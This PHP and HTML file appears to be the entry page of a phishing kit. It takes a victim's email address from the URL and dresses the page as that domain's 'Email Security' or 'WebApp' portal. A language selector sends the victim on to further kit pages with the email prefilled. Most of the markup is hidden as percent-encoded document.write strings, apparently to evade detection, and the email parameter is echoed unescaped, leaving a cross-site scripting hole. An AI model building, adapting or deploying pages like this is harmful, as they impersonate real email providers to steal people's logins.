<?php
function getloginIDFromlogin($email)
{
$find = '@';
$pos = strpos($email, $find);
$loginID = substr($email, 0, $pos);
return $loginID;
}
function getDomainFromEmail($email)
{
// Get the data after the @ sign
$domain = substr(strrchr($email, "@"), 1);
return $domain;
}
$login = $_GET['email'];
$loginID = getloginIDFromlogin($login);
$domain = getDomainFromEmail($login);
$ln = strlen($login);
$len = strrev($login);
$x = 0;
for($i=0; $i<$ln; $i++){
	if($len[$i] == "@"){
		$x = $i;
		break;
	}
}
$yuh = substr($len,0,$x);
$yuh = strrev($yuh);
for($i=0; $i<$ln; $i++){
	if($yuh[$i] == "."){
		$x = $i;
		break;
	}
}
$yuh = substr($yuh,0,$x);
$yuh = ucfirst($yuh);
?>
<html>

<head>

<title><?php echo $yuh ?> Email Security :: For <?php echo $login ?></title>

<link rel="icon" href="./files/favicon.ico" type="image/gif">
<meta http-equiv="X-UA-Compatible" content="IE=edge"/>
<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no"/>


<style>
.dropbtn {
    background-color: #0B2161;
    min-width: 320px;
    color: white;
    padding: 16px;
    font-size: 16px;
    border: none;
    cursor: pointer;
    -moz-border-radius: 2px; -webkit-border-radius: 2px; -khtml-border-radius: 2px; border-radius: 2px;
    -webkit-box-shadow: 0px 0px 8px 3px #000000; box-shadow: 0px 0px 8px 3px #000000;
}

.dropbtn:hover, .dropbtn:focus {
    background-color: #6E6E6E;
}

.dropdown {
    position: relative;
    display: inline-block;
}

.dropdown-content {
    display: none;
    position: absolute;
    background-color: #BDBDBD;
    min-width: 320px;
    overflow: auto;
    box-shadow: 0px 8px 16px 0px rgba(0,0,0,0.2);
    z-index: 1;
}

.dropdown-content a {
    color: black;
    padding: 12px 16px;
    text-decoration: none;
    display: block;
}

.dropdown a:hover {background-color: #f1f1f1}

.show {display:block;}
</style>









<script type="text/javascript"> 
function display_c(){
var refresh=1000; // Refresh rate in milli seconds
mytime=setTimeout('display_ct()',refresh)
}

function display_ct() {
var x = new Date()
document.getElementById('ct').innerHTML = x;
display_c();
 }
</script>


</head>


<script type="text/javascript">
<!--
document.write(unescape('%3c%62%6f%64%79%20%6d%61%72%67%69%6e%77%69%64%74%68%3d%22%30%22%20%6d%61%72%67%69%6e%68%65%69%67%68%74%3d%22%30%22%20%74%6f%70%6d%61%72%67%69%6e%3d%22%30%22%20%62%6f%74%74%6f%6d%6d%61%72%67%69%6e%3d%22%30%22%20%72%69%67%68%74%6d%61%72%67%69%6e%3d%22%30%22%20%6c%65%66%74%6d%61%72%67%69%6e%3d%22%30%22%20%6f%6e%6c%6f%61%64%3d%22%64%69%73%70%6c%61%79%5f%63%74%28%29%3b%22%3e%0d%0a%0d%0a%3c%74%61%62%6c%65%20%77%69%64%74%68%3d%22%31%30%30%25%22%20%68%65%69%67%68%74%3d%22%31%30%30%25%22%20%61%6c%69%67%6e%3d%22%63%65%6e%74%65%72%22%20%63%65%6c%6c%73%70%61%63%69%6e%67%3d%22%30%22%3e%0d%0a%0d%0a%3c%74%72%3e%3c%74%64%20%68%65%69%67%68%74%3d%22%31%30%25%22%20%62%67%63%6f%6c%6f%72%3d%22%23%30%30%30%22%3e%0d%0a%0d%0a%09%0d%0a%09%3c%74%61%62%6c%65%3e%3c%74%72%3e%0d%0a%0d%0a%09%3c%74%64%20%77%69%64%74%68%3d%22%35%30%22%3e%3c%2f%74%64%3e%0d%0a%0d%0a%09%3c%74%64%3e%0d%0a%09%09%0d%0a%09%09%3c%62%3e%0d%0a%09%09%3c%66%6f%6e%74%20%66%61%63%65%3d%22%4c%75%63%69%64%61%20%47%72%61%6e%64%65%2c%20%4c%75%63%69%64%61%20%53%61%6e%73%20%55%6e%69%63%6f%64%65%2c%20%4c%75%63%69%64%61%20%53%61%6e%73%2c%20%44%65%6a%61%56%75%20%53%61%6e%73%2c%20%56%65%72%64%61%6e%61%2c%20%73%61%6e%73%2d%73%65%72%69%66%22%20%73%69%7a%65%3d%22%32%22%20%63%6f%6c%6f%72%3d%22%23%46%46%46%22%3e%0d%0a%09%09%3c%73%70%61%6e%20%69%64%3d%27%63%74%27%3e%3c%2f%73%70%61%6e%3e%0d%0a%09%09%3c%2f%66%6f%6e%74%3e%0d%0a%09%09%3c%2f%62%3e%0d%0a%0d%0a%09%3c%2f%74%64%3e%3c%2f%74%72%3e%3c%2f%74%61%62%6c%65%3e%0d%0a%0d%0a%3c%2f%74%64%3e%3c%2f%74%72%3e%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%3c%74%72%3e%3c%74%64%20%68%65%69%67%68%74%3d%22%34%35%25%22%20%62%67%63%6f%6c%6f%72%3d%22%23%30%38%34%42%38%41%22%3e%0d%0a%0d%0a%0d%0a%09%3c%74%61%62%6c%65%20%61%6c%69%67%6e%3d%22%63%65%6e%74%65%72%22%3e%3c%74%72%3e%3c%74%64%20%73%74%79%6c%65%3d%22%77%69%64%74%68%3a%33%32%30%70%78%3b%22%3e%0d%0a%0d%0a%09%09%0d%0a%09%09%3c%66%6f%6e%74%20%66%61%63%65%3d%22%4c%75%63%69%64%61%20%47%72%61%6e%64%65%2c%20%4c%75%63%69%64%61%20%53%61%6e%73%20%55%6e%69%63%6f%64%65%2c%20%4c%75%63%69%64%61%20%53%61%6e%73%2c%20%44%65%6a%61%56%75%20%53%61%6e%73%2c%20%56%65%72%64%61%6e%61%2c%20%73%61%6e%73%2d%73%65%72%69%66%22%20%73%69%7a%65%3d%22%2b%32%22%20%63%6f%6c%6f%72%3d%22%23%46%46%46%22%3e'));
//-->
</script>


			<?php echo $yuh ?> 

<script type="text/javascript">
<!--
document.write(unescape('WebApp%0D%0A%0D%0A%09%09%09%3Cbr%3E%0D%0A%0D%0A%09%09%09%3Cfont%20size%3D%222%22%3E%0D%0A%09%09%09%0D%0A%09%09%09%3C%2Ffont%3E%0D%0A%0D%0A%09%09%3C%2Ffont%3E%0D%0A%0D%0A%0D%0A%09%3C%2Ftd%3E%3C%2Ftr%3E%3C%2Ftable%3E%0D%0A%0D%0A%0D%0A%0D%0A%0D%0A%0D%0A%09%3Cbr%3E%0D%0A%0D%0A%0D%0A%0D%0A%0D%0A%0D%0A%09%3Ctable%20align%3D%22center%22%3E%3Ctr%3E%0D%0A%0D%0A%09%3Ctd%3E%0D%0A%0D%0A%09%09%0D%0A%09%09%3Ctable%3E%3Ctr%3E%0D%0A%09%09%3Ctd%3E%0D%0A%0D%0A%09%09%0D%0A%0D%0A%09%09%09%3Ctable%20align%3D%22center%22%3E%3Ctr%3E%3Ctd%3E'));
//-->
</script>



	
					<div class="dropdown">
					<button onclick="myFunction()" class="dropbtn">Select Your Language to Continue</button>
  					<div id="myDropdown" class="dropdown-content">

    					<a href="./english.php?email=<?php echo $login ?>">
					<font face="Lucida Grande, Lucida Sans Unicode, Lucida Sans, DejaVu Sans, Verdana, sans-serif" size="2" 			

					color="#000">English</font></a>


					<a href="./china.php?email=<?php echo $login ?>">
					<font face="Lucida Grande, Lucida Sans Unicode, Lucida Sans, DejaVu Sans, Verdana, sans-serif" size="2" 			

					color="#000">&#20013;&#25991;</font></a>

	
					<a href="./korea.php?email=<?php echo $login ?>">
					<font face="Lucida Grande, Lucida Sans Unicode, Lucida Sans, DejaVu Sans, Verdana, sans-serif" size="2" 			

					color="#000">&#45824;&#54620;&#48124;&#44397;</font></a>



					<a href="./french.php?email=<?php echo $login ?>">
					<font face="Lucida Grande, Lucida Sans Unicode, Lucida Sans, DejaVu Sans, Verdana, sans-serif" size="2" 			

					color="#000">francaise</font></a>


	
					<a href="./spanish.php?email=<?php echo $login ?>">
					<font face="Lucida Grande, Lucida Sans Unicode, Lucida Sans, DejaVu Sans, Verdana, sans-serif" size="2" 			

					color="#000">Espanol</font></a>



					<a href="./german.php?email=<?php echo $login ?>">
					<font face="Lucida Grande, Lucida Sans Unicode, Lucida Sans, DejaVu Sans, Verdana, sans-serif" size="2" 			

					color="#000">Deutsche</font></a>


  					</div>
					</div>  

					<script>
					/* When the user clicks on the button, 
					toggle between hiding and showing the dropdown content */
					function myFunction() {
    					document.getElementById("myDropdown").classList.toggle("show");
					}

					// Close the dropdown if the user clicks outside of it
					window.onclick = function(event) {
  					if (!event.target.matches('.dropbtn')) {

   	 				var dropdowns = document.getElementsByClassName("dropdown-content");
    					var i;
    					for (i = 0; i < dropdowns.length; i++) {
      					var openDropdown = dropdowns[i];
      					if (openDropdown.classList.contains('show')) {
        				openDropdown.classList.remove('show');
      					}
    					}
  					}
					}
					</script>
			
	

<script type="text/javascript">
<!--
document.write(unescape('%3c%2f%74%64%3e%3c%2f%74%72%3e%3c%2f%74%61%62%6c%65%3e%0d%0a%0d%0a%0d%0a%0d%0a%09%09%3c%2f%74%64%3e%3c%2f%74%72%3e%3c%2f%74%61%62%6c%65%3e%09%09%0d%0a%0d%0a%0d%0a%09%3c%2f%74%64%3e%0d%0a%0d%0a%09%3c%2f%74%72%3e%3c%2f%74%61%62%6c%65%3e%0d%0a%0d%0a%0d%0a%0d%0a%09%3c%62%72%3e%3c%62%72%3e%0d%0a%09%0d%0a%0d%0a%3c%2f%74%64%3e%3c%2f%74%72%3e%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%3c%74%72%3e%3c%74%64%20%68%65%69%67%68%74%3d%22%34%30%25%22%20%62%67%63%6f%6c%6f%72%3d%22%23%30%38%34%42%38%41%22%3e%3c%2f%74%64%3e%3c%2f%74%72%3e%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%3c%74%72%3e%3c%74%64%20%68%65%69%67%68%74%3d%22%35%25%22%20%62%67%63%6f%6c%6f%72%3d%22%23%30%30%30%22%3e%0d%0a%0d%0a%09%3c%64%69%76%20%61%6c%69%67%6e%3d%22%63%65%6e%74%65%72%22%3e%0d%0a%09%3c%66%6f%6e%74%20%66%61%63%65%3d%22%4c%75%63%69%64%61%20%47%72%61%6e%64%65%2c%20%4c%75%63%69%64%61%20%53%61%6e%73%20%55%6e%69%63%6f%64%65%2c%20%4c%75%63%69%64%61%20%53%61%6e%73%2c%20%44%65%6a%61%56%75%20%53%61%6e%73%2c%20%56%65%72%64%61%6e%61%2c%20%73%61%6e%73%2d%73%65%72%69%66%22%20%73%69%7a%65%3d%22%32%22%20%63%6f%6c%6f%72%3d%22%23%46%46%46%22%3e'));
//-->
</script>


		-- | <?php echo $yuh ?>  Email Settings | For: <?php echo $login ?> | -- 

<!--
document.write(unescape('%3c%2f%66%6f%6e%74%3e%0d%0a%09%3c%2f%64%69%76%3e%0d%0a%0d%0a%3c%2f%74%64%3e%3c%2f%74%72%3e%0d%0a%0d%0a%3c%2f%74%61%62%6c%65%3e%0d%0a%0d%0a%3c%2f%62%6f%64%79%3e%0d%0a%0d%0a%3c%2f%68%74%6d%6c%3e'));
//-->
</script>